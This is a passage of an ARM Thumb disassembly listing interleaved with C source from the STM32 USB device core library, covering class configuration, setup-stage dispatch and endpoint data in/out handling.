 800af0e:	af00      	add	r7, sp, #0
 800af10:	6078      	str	r0, [r7, #4]
#ifdef USE_USBD_COMPOSITE
  pdev->classId = 0U;
#endif /* USE_USBD_COMPOSITE */

  /* Start the low level driver  */
  return USBD_LL_Start(pdev);
 800af12:	6878      	ldr	r0, [r7, #4]
 800af14:	f001 fdca 	bl	800caac <USBD_LL_Start>
 800af18:	4603      	mov	r3, r0
}
 800af1a:	4618      	mov	r0, r3
 800af1c:	3708      	adds	r7, #8
 800af1e:	46bd      	mov	sp, r7
 800af20:	bd80      	pop	{r7, pc}

0800af22 <USBD_RunTestMode>:
  *         Launch test mode process
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_RunTestMode(USBD_HandleTypeDef *pdev)
{
 800af22:	b480      	push	{r7}
 800af24:	b083      	sub	sp, #12
 800af26:	af00      	add	r7, sp, #0
 800af28:	6078      	str	r0, [r7, #4]
  return ret;
#else
  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800af2a:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800af2c:	4618      	mov	r0, r3
 800af2e:	370c      	adds	r7, #12
 800af30:	46bd      	mov	sp, r7
 800af32:	f85d 7b04 	ldr.w	r7, [sp], #4
 800af36:	4770      	bx	lr

0800af38 <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af38:	b580      	push	{r7, lr}
 800af3a:	b084      	sub	sp, #16
 800af3c:	af00      	add	r7, sp, #0
 800af3e:	6078      	str	r0, [r7, #4]
 800af40:	460b      	mov	r3, r1
 800af42:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af44:	2300      	movs	r3, #0
 800af46:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800af48:	687b      	ldr	r3, [r7, #4]
 800af4a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af4e:	2b00      	cmp	r3, #0
 800af50:	d009      	beq.n	800af66 <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800af52:	687b      	ldr	r3, [r7, #4]
 800af54:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af58:	681b      	ldr	r3, [r3, #0]
 800af5a:	78fa      	ldrb	r2, [r7, #3]
 800af5c:	4611      	mov	r1, r2
 800af5e:	6878      	ldr	r0, [r7, #4]
 800af60:	4798      	blx	r3
 800af62:	4603      	mov	r3, r0
 800af64:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af66:	7bfb      	ldrb	r3, [r7, #15]
}
 800af68:	4618      	mov	r0, r3
 800af6a:	3710      	adds	r7, #16
 800af6c:	46bd      	mov	sp, r7
 800af6e:	bd80      	pop	{r7, pc}

0800af70 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af70:	b580      	push	{r7, lr}
 800af72:	b084      	sub	sp, #16
 800af74:	af00      	add	r7, sp, #0
 800af76:	6078      	str	r0, [r7, #4]
 800af78:	460b      	mov	r3, r1
 800af7a:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af7c:	2300      	movs	r3, #0
 800af7e:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800af80:	687b      	ldr	r3, [r7, #4]
 800af82:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af86:	685b      	ldr	r3, [r3, #4]
 800af88:	78fa      	ldrb	r2, [r7, #3]
 800af8a:	4611      	mov	r1, r2
 800af8c:	6878      	ldr	r0, [r7, #4]
 800af8e:	4798      	blx	r3
 800af90:	4603      	mov	r3, r0
 800af92:	2b00      	cmp	r3, #0
 800af94:	d001      	beq.n	800af9a <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800af96:	2303      	movs	r3, #3
 800af98:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af9a:	7bfb      	ldrb	r3, [r7, #15]
}
 800af9c:	4618      	mov	r0, r3
 800af9e:	3710      	adds	r7, #16
 800afa0:	46bd      	mov	sp, r7
 800afa2:	bd80      	pop	{r7, pc}

0800afa4 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800afa4:	b580      	push	{r7, lr}
 800afa6:	b084      	sub	sp, #16
 800afa8:	af00      	add	r7, sp, #0
 800afaa:	6078      	str	r0, [r7, #4]
 800afac:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800afae:	687b      	ldr	r3, [r7, #4]
 800afb0:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800afb4:	6839      	ldr	r1, [r7, #0]
 800afb6:	4618      	mov	r0, r3
 800afb8:	f001 f8a7 	bl	800c10a <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800afbc:	687b      	ldr	r3, [r7, #4]
 800afbe:	2201      	movs	r2, #1
 800afc0:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800afc4:	687b      	ldr	r3, [r7, #4]
 800afc6:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800afca:	461a      	mov	r2, r3
 800afcc:	687b      	ldr	r3, [r7, #4]
 800afce:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800afd2:	687b      	ldr	r3, [r7, #4]
 800afd4:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800afd8:	f003 031f 	and.w	r3, r3, #31
 800afdc:	2b02      	cmp	r3, #2
 800afde:	d01a      	beq.n	800b016 <USBD_LL_SetupStage+0x72>
 800afe0:	2b02      	cmp	r3, #2
 800afe2:	d822      	bhi.n	800b02a <USBD_LL_SetupStage+0x86>
 800afe4:	2b00      	cmp	r3, #0
 800afe6:	d002      	beq.n	800afee <USBD_LL_SetupStage+0x4a>
 800afe8:	2b01      	cmp	r3, #1
 800afea:	d00a      	beq.n	800b002 <USBD_LL_SetupStage+0x5e>
 800afec:	e01d      	b.n	800b02a <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800afee:	687b      	ldr	r3, [r7, #4]
 800aff0:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800aff4:	4619      	mov	r1, r3
 800aff6:	6878      	ldr	r0, [r7, #4]
 800aff8:	f000 fad4 	bl	800b5a4 <USBD_StdDevReq>
 800affc:	4603      	mov	r3, r0
 800affe:	73fb      	strb	r3, [r7, #15]
      break;
 800b000:	e020      	b.n	800b044 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800b002:	687b      	ldr	r3, [r7, #4]
 800b004:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b008:	4619      	mov	r1, r3
 800b00a:	6878      	ldr	r0, [r7, #4]
 800b00c:	f000 fb3c 	bl	800b688 <USBD_StdItfReq>
 800b010:	4603      	mov	r3, r0
 800b012:	73fb      	strb	r3, [r7, #15]
      break;
 800b014:	e016      	b.n	800b044 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800b016:	687b      	ldr	r3, [r7, #4]
 800b018:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b01c:	4619      	mov	r1, r3
 800b01e:	6878      	ldr	r0, [r7, #4]
 800b020:	f000 fb9e 	bl	800b760 <USBD_StdEPReq>
 800b024:	4603      	mov	r3, r0
 800b026:	73fb      	strb	r3, [r7, #15]
      break;
 800b028:	e00c      	b.n	800b044 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b02a:	687b      	ldr	r3, [r7, #4]
 800b02c:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b030:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b034:	b2db      	uxtb	r3, r3
 800b036:	4619      	mov	r1, r3
 800b038:	6878      	ldr	r0, [r7, #4]
 800b03a:	f001 fe13 	bl	800cc64 <USBD_LL_StallEP>
 800b03e:	4603      	mov	r3, r0
 800b040:	73fb      	strb	r3, [r7, #15]
      break;
 800b042:	bf00      	nop
  }

  return ret;
 800b044:	7bfb      	ldrb	r3, [r7, #15]
}
 800b046:	4618      	mov	r0, r3
 800b048:	3710      	adds	r7, #16
 800b04a:	46bd      	mov	sp, r7
 800b04c:	bd80      	pop	{r7, pc}

0800b04e <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b04e:	b580      	push	{r7, lr}
 800b050:	b086      	sub	sp, #24
 800b052:	af00      	add	r7, sp, #0
 800b054:	60f8      	str	r0, [r7, #12]
 800b056:	460b      	mov	r3, r1
 800b058:	607a      	str	r2, [r7, #4]
 800b05a:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b05c:	2300      	movs	r3, #0
 800b05e:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b060:	7afb      	ldrb	r3, [r7, #11]
 800b062:	2b00      	cmp	r3, #0
 800b064:	d16e      	bne.n	800b144 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b066:	68fb      	ldr	r3, [r7, #12]
 800b068:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b06c:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b06e:	68fb      	ldr	r3, [r7, #12]
 800b070:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b074:	2b03      	cmp	r3, #3
 800b076:	f040 8098 	bne.w	800b1aa <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b07a:	693b      	ldr	r3, [r7, #16]
 800b07c:	689a      	ldr	r2, [r3, #8]
 800b07e:	693b      	ldr	r3, [r7, #16]
 800b080:	68db      	ldr	r3, [r3, #12]
 800b082:	429a      	cmp	r2, r3
 800b084:	d913      	bls.n	800b0ae <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b086:	693b      	ldr	r3, [r7, #16]
 800b088:	689a      	ldr	r2, [r3, #8]
 800b08a:	693b      	ldr	r3, [r7, #16]
 800b08c:	68db      	ldr	r3, [r3, #12]
 800b08e:	1ad2      	subs	r2, r2, r3
 800b090:	693b      	ldr	r3, [r7, #16]
 800b092:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b094:	693b      	ldr	r3, [r7, #16]
 800b096:	68da      	ldr	r2, [r3, #12]
 800b098:	693b      	ldr	r3, [r7, #16]
 800b09a:	689b      	ldr	r3, [r3, #8]
 800b09c:	4293      	cmp	r3, r2
 800b09e:	bf28      	it	cs
 800b0a0:	4613      	movcs	r3, r2
 800b0a2:	461a      	mov	r2, r3
 800b0a4:	6879      	ldr	r1, [r7, #4]
 800b0a6:	68f8      	ldr	r0, [r7, #12]
 800b0a8:	f001 f923 	bl	800c2f2 <USBD_CtlContinueRx>
 800b0ac:	e07d      	b.n	800b1aa <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b0ae:	68fb      	ldr	r3, [r7, #12]
 800b0b0:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b0b4:	f003 031f 	and.w	r3, r3, #31
 800b0b8:	2b02      	cmp	r3, #2
 800b0ba:	d014      	beq.n	800b0e6 <USBD_LL_DataOutStage+0x98>
 800b0bc:	2b02      	cmp	r3, #2
 800b0be:	d81d      	bhi.n	800b0fc <USBD_LL_DataOutStage+0xae>
 800b0c0:	2b00      	cmp	r3, #0
 800b0c2:	d002      	beq.n	800b0ca <USBD_LL_DataOutStage+0x7c>
 800b0c4:	2b01      	cmp	r3, #1
 800b0c6:	d003      	beq.n	800b0d0 <USBD_LL_DataOutStage+0x82>
 800b0c8:	e018      	b.n	800b0fc <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b0ca:	2300      	movs	r3, #0
 800b0cc:	75bb      	strb	r3, [r7, #22]
            break;
 800b0ce:	e018      	b.n	800b102 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b0d0:	68fb      	ldr	r3, [r7, #12]
 800b0d2:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0d6:	b2db      	uxtb	r3, r3
 800b0d8:	4619      	mov	r1, r3
 800b0da:	68f8      	ldr	r0, [r7, #12]
 800b0dc:	f000 f9d2 	bl	800b484 <USBD_CoreFindIF>
 800b0e0:	4603      	mov	r3, r0
 800b0e2:	75bb      	strb	r3, [r7, #22]
            break;
 800b0e4:	e00d      	b.n	800b102 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b0e6:	68fb      	ldr	r3, [r7, #12]
 800b0e8:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0ec:	b2db      	uxtb	r3, r3
 800b0ee:	4619      	mov	r1, r3
 800b0f0:	68f8      	ldr	r0, [r7, #12]
 800b0f2:	f000 f9d4 	bl	800b49e <USBD_CoreFindEP>
 800b0f6:	4603      	mov	r3, r0
 800b0f8:	75bb      	strb	r3, [r7, #22]
            break;
 800b0fa:	e002      	b.n	800b102 <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b0fc:	2300      	movs	r3, #0
 800b0fe:	75bb      	strb	r3, [r7, #22]
            break;
 800b100:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b102:	7dbb      	ldrb	r3, [r7, #22]
 800b104:	2b00      	cmp	r3, #0
 800b106:	d119      	bne.n	800b13c <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b108:	68fb      	ldr	r3, [r7, #12]
 800b10a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b10e:	b2db      	uxtb	r3, r3
 800b110:	2b03      	cmp	r3, #3
 800b112:	d113      	bne.n	800b13c <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b114:	7dba      	ldrb	r2, [r7, #22]
 800b116:	68fb      	ldr	r3, [r7, #12]
 800b118:	32ae      	adds	r2, #174	; 0xae
 800b11a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b11e:	691b      	ldr	r3, [r3, #16]
 800b120:	2b00      	cmp	r3, #0
 800b122:	d00b      	beq.n	800b13c <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b124:	7dba      	ldrb	r2, [r7, #22]
 800b126:	68fb      	ldr	r3, [r7, #12]
 800b128:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b12c:	7dba      	ldrb	r2, [r7, #22]
 800b12e:	68fb      	ldr	r3, [r7, #12]
 800b130:	32ae      	adds	r2, #174	; 0xae
 800b132:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b136:	691b      	ldr	r3, [r3, #16]
 800b138:	68f8      	ldr	r0, [r7, #12]
 800b13a:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b13c:	68f8      	ldr	r0, [r7, #12]
 800b13e:	f001 f8e9 	bl	800c314 <USBD_CtlSendStatus>
 800b142:	e032      	b.n	800b1aa <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b144:	7afb      	ldrb	r3, [r7, #11]
 800b146:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b14a:	b2db      	uxtb	r3, r3
 800b14c:	4619      	mov	r1, r3
 800b14e:	68f8      	ldr	r0, [r7, #12]
 800b150:	f000 f9a5 	bl	800b49e <USBD_CoreFindEP>
 800b154:	4603      	mov	r3, r0
 800b156:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b158:	7dbb      	ldrb	r3, [r7, #22]
 800b15a:	2bff      	cmp	r3, #255	; 0xff
 800b15c:	d025      	beq.n	800b1aa <USBD_LL_DataOutStage+0x15c>
 800b15e:	7dbb      	ldrb	r3, [r7, #22]
 800b160:	2b00      	cmp	r3, #0
 800b162:	d122      	bne.n	800b1aa <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b164:	68fb      	ldr	r3, [r7, #12]
 800b166:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b16a:	b2db      	uxtb	r3, r3
 800b16c:	2b03      	cmp	r3, #3
 800b16e:	d117      	bne.n	800b1a0 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b170:	7dba      	ldrb	r2, [r7, #22]
 800b172:	68fb      	ldr	r3, [r7, #12]
 800b174:	32ae      	adds	r2, #174	; 0xae
 800b176:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b17a:	699b      	ldr	r3, [r3, #24]
 800b17c:	2b00      	cmp	r3, #0
 800b17e:	d00f      	beq.n	800b1a0 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b180:	7dba      	ldrb	r2, [r7, #22]
 800b182:	68fb      	ldr	r3, [r7, #12]
 800b184:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b188:	7dba      	ldrb	r2, [r7, #22]
 800b18a:	68fb      	ldr	r3, [r7, #12]
 800b18c:	32ae      	adds	r2, #174	; 0xae
 800b18e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b192:	699b      	ldr	r3, [r3, #24]
 800b194:	7afa      	ldrb	r2, [r7, #11]
 800b196:	4611      	mov	r1, r2
 800b198:	68f8      	ldr	r0, [r7, #12]
 800b19a:	4798      	blx	r3
 800b19c:	4603      	mov	r3, r0
 800b19e:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b1a0:	7dfb      	ldrb	r3, [r7, #23]
 800b1a2:	2b00      	cmp	r3, #0
 800b1a4:	d001      	beq.n	800b1aa <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b1a6:	7dfb      	ldrb	r3, [r7, #23]
 800b1a8:	e000      	b.n	800b1ac <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b1aa:	2300      	movs	r3, #0
}
 800b1ac:	4618      	mov	r0, r3
 800b1ae:	3718      	adds	r7, #24
 800b1b0:	46bd      	mov	sp, r7
 800b1b2:	bd80      	pop	{r7, pc}

0800b1b4 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b1b4:	b580      	push	{r7, lr}
 800b1b6:	b086      	sub	sp, #24
 800b1b8:	af00      	add	r7, sp, #0
 800b1ba:	60f8      	str	r0, [r7, #12]
 800b1bc:	460b      	mov	r3, r1
 800b1be:	607a      	str	r2, [r7, #4]
 800b1c0:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b1c2:	7afb      	ldrb	r3, [r7, #11]
 800b1c4:	2b00      	cmp	r3, #0
 800b1c6:	d16f      	bne.n	800b2a8 <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b1c8:	68fb      	ldr	r3, [r7, #12]
 800b1ca:	3314      	adds	r3, #20
 800b1cc:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b1ce:	68fb      	ldr	r3, [r7, #12]
 800b1d0:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b1d4:	2b02      	cmp	r3, #2
 800b1d6:	d15a      	bne.n	800b28e <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b1d8:	693b      	ldr	r3, [r7, #16]
 800b1da:	689a      	ldr	r2, [r3, #8]
 800b1dc:	693b      	ldr	r3, [r7, #16]
 800b1de:	68db      	ldr	r3, [r3, #12]
 800b1e0:	429a      	cmp	r2, r3
 800b1e2:	d914      	bls.n	800b20e <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b1e4:	693b      	ldr	r3, [r7, #16]
 800b1e6:	689a      	ldr	r2, [r3, #8]
 800b1e8:	693b      	ldr	r3, [r7, #16]
 800b1ea:	68db      	ldr	r3, [r3, #12]
 800b1ec:	1ad2      	subs	r2, r2, r3
 800b1ee:	693b      	ldr	r3, [r7, #16]
 800b1f0:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b1f2:	693b      	ldr	r3, [r7, #16]
 800b1f4:	689b      	ldr	r3, [r3, #8]
 800b1f6:	461a      	mov	r2, r3
 800b1f8:	6879      	ldr	r1, [r7, #4]
 800b1fa:	68f8      	ldr	r0, [r7, #12]
 800b1fc:	f001 f84b 	bl	800c296 <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b200:	2300      	movs	r3, #0
 800b202:	2200      	movs	r2, #0
 800b204:	2100      	movs	r1, #0
 800b206:	68f8      	ldr	r0, [r7, #12]
 800b208:	f001 fe34 	bl	800ce74 <USBD_LL_PrepareReceive>
 800b20c:	e03f      	b.n	800b28e <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b20e:	693b      	ldr	r3, [r7, #16]
 800b210:	68da      	ldr	r2, [r3, #12]
 800b212:	693b      	ldr	r3, [r7, #16]
 800b214:	689b      	ldr	r3, [r3, #8]
 800b216:	429a      	cmp	r2, r3
 800b218:	d11c      	bne.n	800b254 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b21a:	693b      	ldr	r3, [r7, #16]
 800b21c:	685a      	ldr	r2, [r3, #4]
 800b21e:	693b      	ldr	r3, [r7, #16]
 800b220:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b222:	429a      	cmp	r2, r3
 800b224:	d316      	bcc.n	800b254 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b226:	693b      	ldr	r3, [r7, #16]
 800b228:	685a      	ldr	r2, [r3, #4]
 800b22a:	68fb      	ldr	r3, [r7, #12]
 800b22c:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b230:	429a      	cmp	r2, r3
 800b232:	d20f      	bcs.n	800b254 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b234:	2200      	movs	r2, #0
 800b236:	2100      	movs	r1, #0
 800b238:	68f8      	ldr	r0, [r7, #12]
 800b23a:	f001 f82c 	bl	800c296 <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b23e:	68fb      	ldr	r3, [r7, #12]
 800b240:	2200      	movs	r2, #0
 800b242:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b246:	2300      	movs	r3, #0
 800b248:	2200      	movs	r2, #0
 800b24a:	2100      	movs	r1, #0
 800b24c:	68f8      	ldr	r0, [r7, #12]
 800b24e:	f001 fe11 	bl	800ce74 <USBD_LL_PrepareReceive>
 800b252:	e01c      	b.n	800b28e <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b254:	68fb      	ldr	r3, [r7, #12]
 800b256:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b25a:	b2db      	uxtb	r3, r3
 800b25c:	2b03      	cmp	r3, #3
 800b25e:	d10f      	bne.n	800b280 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b260:	68fb      	ldr	r3, [r7, #12]
 800b262:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b266:	68db      	ldr	r3, [r3, #12]
 800b268:	2b00      	cmp	r3, #0
 800b26a:	d009      	beq.n	800b280 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b26c:	68fb      	ldr	r3, [r7, #12]
 800b26e:	2200      	movs	r2, #0
 800b270:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b274:	68fb      	ldr	r3, [r7, #12]
 800b276:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b27a:	68db      	ldr	r3, [r3, #12]
 800b27c:	68f8      	ldr	r0, [r7, #12]
 800b27e:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b280:	2180      	movs	r1, #128	; 0x80
 800b282:	68f8      	ldr	r0, [r7, #12]
 800b284:	f001 fcee 	bl	800cc64 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b288:	68f8      	ldr	r0, [r7, #12]
 800b28a:	f001 f856 	bl	800c33a <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b28e:	68fb      	ldr	r3, [r7, #12]
 800b290:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b294:	2b00      	cmp	r3, #0
 800b296:	d03a      	beq.n	800b30e <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b298:	68f8      	ldr	r0, [r7, #12]
 800b29a:	f7ff fe42 	bl	800af22 <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b29e:	68fb      	ldr	r3, [r7, #12]
 800b2a0:	2200      	movs	r2, #0
 800b2a2:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b2a6:	e032      	b.n	800b30e <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b2a8:	7afb      	ldrb	r3, [r7, #11]
 800b2aa:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b2ae:	b2db      	uxtb	r3, r3
 800b2b0:	4619      	mov	r1, r3
 800b2b2:	68f8      	ldr	r0, [r7, #12]
 800b2b4:	f000 f8f3 	bl	800b49e <USBD_CoreFindEP>
 800b2b8:	4603      	mov	r3, r0
 800b2ba:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b2bc:	7dfb      	ldrb	r3, [r7, #23]
 800b2be:	2bff      	cmp	r3, #255	; 0xff
 800b2c0:	d025      	beq.n	800b30e <USBD_LL_DataInStage+0x15a>
 800b2c2:	7dfb      	ldrb	r3, [r7, #23]
 800b2c4:	2b00      	cmp	r3, #0
 800b2c6:	d122      	bne.n	800b30e <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2c8:	68fb      	ldr	r3, [r7, #12]
 800b2ca:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2ce:	b2db      	uxtb	r3, r3
 800b2d0:	2b03      	cmp	r3, #3
 800b2d2:	d11c      	bne.n	800b30e <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
